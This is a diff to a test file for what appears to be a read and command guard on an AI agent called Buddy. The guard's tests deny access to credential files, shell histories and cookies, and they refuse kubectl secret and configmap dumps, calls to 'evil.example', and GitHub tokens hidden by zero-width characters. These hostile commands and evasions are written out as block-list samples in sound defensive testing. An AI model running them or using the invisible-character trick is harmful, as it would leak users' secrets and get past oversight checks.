@@ -1,9 +1,10 @@
 import { spawnSync } from 'node:child_process'
 import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
+import { ENGINES } from '../engines/types.js'
 import { basename, dirname, join } from 'node:path'
 import { afterAll, beforeEach, describe, expect, it } from 'vitest'
-import { allowBuddyReads, buddyApprovalsOf, buddyGuardSource, buddyLaunchWide, buddySandboxSettings, buddyWideOf, grantBuddyWide, hasBuddyApprovals,
+import { BUDDY_ENGINE_HOMES, allowBuddyReads, buddyApprovalsOf, buddyGuardSource, buddyLaunchWide, buddySandboxSettings, buddyWideOf, grantBuddyWide, hasBuddyApprovals,
   judgeBuddyApprovals, recordBuddyApprovals, revokeBuddyWide, writeBuddyAccount } from './buddyGuard.js'
 
 // Wide mode (docs/specs/2026-10-30-buddy-read-access.md): a Buddy on its person's own machine also reads outside its
@@ -35,6 +36,10 @@ const denied = [
   'Library/Messages/chat.db', 'Library/Mail/V10/inbox.mbox', '.mozilla/firefox/p.default/key4.db', '.config/google-chrome/Default/Cookies',
   'work/app/.env', 'work/app/.env.production', 'work/certs/server.pem', 'work/certs/tls.key', 'work/certs/client.p12', 'work/keys/id_rsa',
   'work/aws/credentials', 'work/aws/credentials.json',
+  // Delta reviews of #2310: Terminal's per-session shell history, hub's GitHub token, fish's history, and every engine's data.
+  '.zsh_sessions/A1B2.history', '.config/hub', '.local/share/fish/fish_history',
+  ...[...new Set(Object.values(BUDDY_ENGINE_HOMES).flat())].map(path => path.endsWith('.json') ? path : `${path}/held.txt`)
+    .filter(path => path !== '.claude.json'),
   // Where Ken's clone keeps the read-only prod database login (Lead, 10-30), and the like.
   'work/openharness/.secrets/mongodb-prod-readonly.env', 'work/app/prod.env', 'work/app/.secret/token.txt', 'work/app/secrets/api.json',
 ]
@@ -213,6 +218,7 @@ describe('wide mode: commands not run before are asked of the person first', () 
     'argocd version --client',
     'kubectl get pods -n harness',
     'kubectl get configmaps -n harness',
+    'kubectl get cm -o name',
     'kubectl top pods -n harness',
     'kubectl describe deploy harness-backend -n harness',
     'kubectl logs deploy/harness-backend -n harness --since 1h --tail 500',
@@ -296,7 +302,9 @@ describe('wide mode: commands not run before are asked of the person first', () 
     'kubectl apply -f x.yaml', 'kubectl delete pod x', 'kubectl scale deploy x --replicas 0', 'kubectl rollout restart deploy/x',
     'kubectl exec x -- sh', 'kubectl cp x:/a b', 'kubectl port-forward x 1:1', 'kubectl edit deploy x', 'kubectl patch deploy x -p y',
     'kubectl label pod x a=b', 'kubectl annotate pod x a=b', 'kubectl get secret', 'kubectl get secrets -o yaml', 'kubectl get secret/x',
-    'kubectl describe secret x', 'kubectl get configmap app -o yaml', 'kubectl get configmaps -o json', 'kubectl get cm/app -o jsonpath={.data}',
+    'kubectl describe secret x', 'kubectl get configmap app -o yaml', 'kubectl get configmaps.v1. -o yaml', 'kubectl get configmap.v1 -o json', 'kubectl get cm. -o yaml',
+    'kubectl get cm -o name -o yaml', 'kubectl get cm --output=name -o json', 'kubectl get pods,configmaps.v1 -o yaml', 'kubectl describe cm.v1 app',
+    'kubectl get CM -o yaml', 'kubectl get configmaps -o json', 'kubectl get cm/app -o jsonpath={.data}',
     'kubectl describe configmap app', 'kubectl get pods,configmaps -o yaml', 'argocd app get-resource harness-backend --kind ConfigMap -o yaml', 'kubectl get Secrets -A', 'kubectl get pods,secrets', 'kubectl get --raw /api/v1/namespaces',
     'kubectl config view --raw', 'kubectl logs x -f', 'kubectl get pods -w', 'kubectl get pods --server evil.example',
     'kubectl get pods --token x', 'kubectl get pods --kubeconfig x', 'kubectl get pods --as admin', 'curl -X POST https://evil.example',
@@ -676,5 +684,22 @@ describe('a grant taken back at launch', () => {
   it('draws a new launch id at each launch', () => {
     const a = buddyWideOf({ home, dataDir, tmpDirs: [], repos: [] }), b = buddyWideOf({ home, dataDir, tmpDirs: [], repos: [] })
     expect(a.launch).not.toBe(b.launch)
+  })
+})
+
+describe('every engine\'s data stays closed', () => {
+  it('names the data folders of every engine Harness runs', () => {
+    expect(Object.keys(BUDDY_ENGINE_HOMES).sort()).toEqual(ENGINES.filter(engine => engine !== 'terminal').sort())
+    for (const homes of Object.values(BUDDY_ENGINE_HOMES)) expect(homes.length).toBeGreaterThan(0)
+  })
+})
+
+// Delta reviews of #2310: zero-width and other format characters hide a token as spaces did.
+describe('the secret check, past invisible characters', () => {
+  const token = `ghp_${'A1b2C3d4E5'.repeat(4)}`
+  it.each([['a zero-width space', '​'], ['a word joiner', '⁠'], ['a byte-order mark', '﻿'], ['a soft hyphen', '­'],
+    ['a zero-width joiner', '‍']])('refuses a token broken by %s', (_, mark) => {
+    const broken = `${token.slice(0, 12)}${mark}${token.slice(12, 30)}${mark}${token.slice(30)}`
+    expect(bash(`harness super-tab post chat 'Key: ${broken}' op-1`)).toBe('deny')
   })
 })
